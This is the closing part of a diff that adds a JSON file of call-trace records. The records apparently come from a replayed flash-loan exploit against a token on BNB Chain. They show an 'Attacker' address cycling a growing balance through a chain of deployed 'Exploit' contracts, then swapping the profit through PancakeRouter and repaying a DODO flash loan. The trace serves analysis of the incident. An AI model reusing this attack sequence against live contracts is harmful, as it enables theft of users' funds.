+        "args": "Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], 19155056560174942706121974 [1.915e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "249384101754585311770088017 [2.493e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 249384101754585311770088017 [2.493e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "249384101754585311770088017 [2.493e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], 249384101754585311770088017 [2.493e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "249384101754585311770088016 [2.493e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], 20748757265981497939271322 [2.074e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "270132859020566809709359338 [2.701e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 270132859020566809709359338 [2.701e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "270132859020566809709359338 [2.701e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], 270132859020566809709359338 [2.701e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc]",
+        "original_code": null,
+        "description": null,
+        "return_value": "270132859020566809709359337 [2.701e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], 22475053870511158567818696 [2.247e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc]",
+        "original_code": null,
+        "description": null,
+        "return_value": "292607912891077968277178033 [2.926e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 292607912891077968277178033 [2.926e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "292607912891077968277178033 [2.926e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], 292607912891077968277178033 [2.926e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE]",
+        "original_code": null,
+        "description": null,
+        "return_value": "292607912891077968277178032 [2.926e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], 24344978352537686960661212 [2.434e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE]",
+        "original_code": null,
+        "description": null,
+        "return_value": "316952891243615655237839244 [3.169e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 316952891243615655237839244 [3.169e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "316952891243615655237839244 [3.169e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], 316952891243615655237839244 [3.169e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "316952891243615655237839243 [3.169e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], 26370480551468822515788225 [2.637e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "343323371795084477753627468 [3.433e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 343323371795084477753627468 [3.433e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "343323371795084477753627468 [3.433e26]"
+    },
+    {
+        "id": "0",
+        "args": "\"Swap the profit...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "343323371795084477753627468 [3.433e26]"
+    },
+    {
+        "id": "25260",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "141656",
+        "args": "343323371795084477753627468 [3.433e26], 0, [0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9, 0x55d398326f99059fF775485246999027B3197955, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662602962 [1.662e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "65213",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x26C0623847637095655B2868C3182B2285bDAeAf, 343323371795084477753627468 [3.433e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "1395988815847563510429694 [1.395e24]"
+    },
+    {
+        "id": "534",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "131638156568548302426278480 [1.316e26], 1395988815847563510429694 [1.395e24], 1662602962 [1.662e9]"
+    },
+    {
+        "id": "2855",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "375397750543058281631353982 [3.753e26]"
+    },
+    {
+        "id": "20685",
+        "args": "0, 905671031037792933831664 [9.056e23], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 905671031037792933831664 [9.056e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "375397750543058281631353982 [3.753e26]"
+    },
+    {
+        "id": "531",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "490317784809770576598030 [4.903e23]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "79747134749549874076317482 [7.974e25], 285941344537148023026067 [2.859e23], 1662602962 [1.662e9]"
+    },
+    {
+        "id": "531",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "80652805780587667010149146 [8.065e25]"
+    },
+    {
+        "id": "38255",
+        "args": "0, 3202971303206254291601 [3.202e21], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3202971303206254291601 [3.202e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "80652805780587667010149146 [8.065e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "282738373233941768734466 [2.827e23]"
+    },
+    {
+        "id": "534",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3202971303206254291601 [3.202e21]"
+    },
+    {
+        "id": "0",
+        "args": "\"Repay the flashloan...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7], 250000000000000000000 [2.5e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2952971303206254291601 [2.952e21]"
+    },
+    {
+        "id": "2487",
+        "args": "DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "655460837613469442277231 [6.554e23]"
+    },
+    {
+        "id": "534",
+        "args": "DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "284730287257090013667 [2.847e20]"
+    },
+    {
+        "id": "487",
+        "args": "DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "655460837613469442277231 [6.554e23]"
+    },
+    {
+        "id": "534",
+        "args": "DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "284730287257090013667 [2.847e20]"
+    }
+]
